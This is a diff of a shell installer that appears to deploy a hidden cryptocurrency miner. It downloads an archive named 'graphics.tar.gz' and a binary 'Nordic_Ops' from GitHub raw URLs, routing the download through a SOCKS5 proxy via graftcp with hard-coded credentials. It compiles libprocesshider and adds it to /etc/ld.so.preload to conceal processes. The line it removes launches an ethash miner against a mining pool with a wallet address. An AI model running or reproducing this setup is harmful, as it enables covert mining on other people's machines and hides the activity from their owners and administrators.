@@ -4,7 +4,7 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://github.com/scatterfafafa/jembot/raw/main/graphics.tar.gz
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -16,7 +16,7 @@ socks5_username = sikilnjaran
 socks5_password = Njejekatos
 END
 
-sudo ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
@@ -35,7 +35,6 @@ echo "**"
 echo " "
 echo " "
 
-
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Nordic_Ops
 chmod +x Nordic_Ops
 
@@ -45,6 +44,3 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-sudo ./graftcp/graftcp -w --whiteip-file=ips.txt prog ./Nordic_Ops --algo ethash --hostname eth-eu1.hellominer.com --port 5555 --wallet 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d --worker-name Black_Dick
-	
